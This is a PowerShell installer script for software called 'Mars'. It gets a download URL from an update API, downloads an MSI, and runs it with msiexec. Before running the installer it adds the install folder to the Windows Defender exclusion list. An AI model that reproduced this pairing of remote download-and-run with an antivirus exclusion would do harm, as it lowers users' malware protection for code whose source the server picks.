# Define variables
$apiUrl = "https://api.marscomputers.tech/v1/external/rover/updates/check?version=0.0.1&target=windows&arch=x86_64"
$downloadUrl = ""
$installerPath = "$env:TEMP\MarsInstaller.msi"
$targetFolder = "C:\Program Files\Mars"

# Step 1: Get the download URL
Write-Host "Fetching URL..." -ForegroundColor Green
try {
    $response = Invoke-RestMethod -Uri $apiUrl
    $downloadUrl = $response.url
} catch {
    Write-Host "Failed to fetch URL. Please try again later." -ForegroundColor Red
    exit 1
}

# Step 2: Download the MSI
Write-Host "Downloading installer..." -ForegroundColor Green
Invoke-WebRequest -Uri $downloadUrl -OutFile $installerPath

# Step 3: Create the folder in Program Files
Write-Host "Creating target folder..." -ForegroundColor Green
if (!(Test-Path -Path $targetFolder)) {
    New-Item -ItemType Directory -Path $targetFolder -Force
    Write-Host "Folder created at $targetFolder"
} else {
    Write-Host "Folder already exists."
}

# Step 4: Add the folder to Windows Defender exclusion list
Write-Host "Adding folder to Windows Defender exclusion list..." -ForegroundColor Green
Add-MpPreference -ExclusionPath $targetFolder

# Step 5: Start the installer
Write-Host "Starting the installer..." -ForegroundColor Green
try {
    Start-Process "msiexec.exe" -ArgumentList "/i $installerPath" -Wait
    Write-Host "Installer completed successfully." -ForegroundColor Green
}
catch {
    Write-Host "Failed to start the installer. Please try again later." -ForegroundColor Red
    exit 1
}

# Step 6: Cleanup (optional)
Write-Host "Cleaning up downloaded installer..." -ForegroundColor Green
Remove-Item -Path $installerPath -Force

Write-Host "Installation completed successfully!" -ForegroundColor Green
